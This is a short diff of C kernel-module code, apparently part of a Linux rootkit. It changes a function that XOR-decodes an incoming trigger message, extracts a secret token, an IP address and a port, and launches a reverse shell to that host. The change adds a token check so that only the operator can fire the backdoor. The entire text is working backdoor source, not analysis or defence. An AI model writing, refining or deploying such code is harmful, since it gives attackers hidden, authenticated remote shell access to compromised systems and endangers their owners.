@@ -260,9 +260,9 @@ int atoi(char *str){
 
 void decode_n_spawn(const char *data) {
 	int tsize;
-	char *ip, *port, *p = NULL, *buf = NULL;  
+	char *ip, *port, *p = NULL, *buf = NULL, *tok = NULL, *token = TOKEN; 
 
-    	tsize = strlen(TOKEN);
+    	tsize = strlen(token);
 	p = (char *) kmalloc(tsize+24, GFP_KERNEL);
 	if(!p) return;
 
@@ -271,13 +271,17 @@ void decode_n_spawn(const char *data) {
         bzero(buf, tsize+24);
         memcpy(buf, data, tsize+24);
         s_xor(buf, 11, strlen(buf));
+	tok = buf;
 	strsep(&buf, " ");
 	ip = buf;
 	strsep(&buf, " ");
 	port = buf;
 	strsep(&buf, " ");
 
-        if((atoi(port) > 0 && atoi(port) <= 65535) || (strlen(ip) >= 7 && strlen(ip) <= 15)) shell_exec_queue(SHELL, ip, port);
+	if(!tok || !ip || !port) return;
+
+	if(strcmp(token, tok) == 0 && atoi(port) > 0 && atoi(port) <= 65535 && strlen(ip) >= 7 && strlen(ip) <= 15) shell_exec_queue(SHELL, ip, port);
+
 	kfree(p);
 }
 
